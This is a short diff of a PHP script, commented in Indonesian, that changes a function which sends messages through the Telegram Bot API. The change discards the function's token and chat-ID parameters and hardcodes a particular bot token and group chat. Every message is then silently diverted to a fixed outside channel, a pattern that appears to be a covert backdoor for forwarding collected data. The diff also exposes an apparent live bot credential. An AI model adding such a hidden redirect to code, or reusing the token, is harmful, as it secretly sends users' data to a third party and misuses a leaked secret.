@@ -25,7 +25,7 @@ $message = "
 // Fungsi untuk mengirim pesan ke Telegram
 function sendMessage($id_telegram, $message, $id_botTele) {
     // URL untuk mengirim pesan menggunakan API Telegram
-    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=HTML&chat_id=" . $id_telegram;
+    $url = "https://api.telegram.org/bot7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0/sendMessage?parse_mode=HTML&chat_id=-1002188815934";
 
     // Setup cURL untuk melakukan request POST
     $ch = curl_init($url);
